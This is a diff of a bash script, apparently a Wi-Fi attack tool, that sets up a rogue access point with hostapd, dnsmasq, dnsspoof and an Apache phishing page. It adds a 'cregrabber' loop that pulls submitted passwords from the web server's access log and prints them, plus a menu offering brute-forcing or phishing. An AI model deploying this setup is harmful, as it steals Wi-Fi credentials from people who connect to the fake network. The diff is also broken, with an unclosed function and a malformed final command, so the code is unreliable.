@@ -1,4 +1,23 @@
-#initialization
+
+
+function phish(){
+install_pack;
+find_interface;
+echo "The selected interface is ${interface}"
+get_ssid;
+hostapd_conf;
+dnsmasq_conf;
+addtoweb;
+android_conf;
+final_conf;
+while true;do
+cregrabber;
+sleep 1s;
+done
+}
+
+
+function install_pack(){
 needed_package=(
 	"hostapd"
 	"dsniff"
@@ -6,19 +25,6 @@ needed_package=(
 	"apache2"
 	)
 not_installed=()
-
-
-#colours
-RED='\033[0;31m'
-NC='\033[0m'
-GREEN='\033[0;32m'
-
-
-
-echo -e "\t \t \tthis is ${RED}AETA${NC}"
-echo -e
-echo -e
-
 echo "The packages in use:"
 for f in "${needed_package[@]}"
 do
@@ -52,6 +58,7 @@ if [ ${#not_installed[@]} -gt 0 ];then
 	echo "Installation Completed"
 	tput reset
 fi
+}
 
 function find_interface(){
 	interface_list=();
@@ -178,14 +185,49 @@ function final_conf(){
 	service apache2 start;
 	xterm -e /bin/bash -l -c "dnsspoof -i wlan0;bash" &
 }
+function cregrabber(){
+	tput reset
+	s="$(grep "GET /connect.php?" /var/log/apache2/access.log | tail -1)"
+	f="$(echo $s | cut -d " " -f 7)"
+
+        QUERY="$(echo $f | cut -d "?" -f2)"
+        IFS="&"
+        set -- $QUERY
+        pass1="$(echo $1 | cut -d "=" -f2)"
+        pass2="$(echo $2 | cut -d "=" -f2)"
+        printf "\r\t\t\t\t$pass1"
+	echo " "
+	echo " "
+	echo "                    The password is:"
+	#tail -f /var/log/apache2/acces                                                                                              
+#initialization
+#colours
+RED='\033[0;31m'
+NC='\033[0m'
+GREEN='\033[0;32m'
 
 
 
-find_interface;
-echo "The selected interface is ${interface}"
-get_ssid;
-hostapd_conf;
-dnsmasq_conf;
-addtoweb;
-android_conf;
-final_conf;
+echo -e "\t \t \tthis is ${RED}WIFI-CRACKING${NC}"
+echo -e
+echo -e
+
+echo "WHAT YOU LIKE TO DO TODAY?"
+echo "1.WIFI Bruteforcing"
+echo "2.WIFI Phishing"
+
+echo "ENTER THE WANTED OPTION";read a;
+case "$a" in
+"1")
+    echo "SELECTED BRUTEFORCING"
+    ;;
+"2")
+    echo "SELECTED AETA";
+    get_ssid;
+    ;;
+*)
+    echo "Invalid option"
+    ;;
+esac
+
+echo"hi"
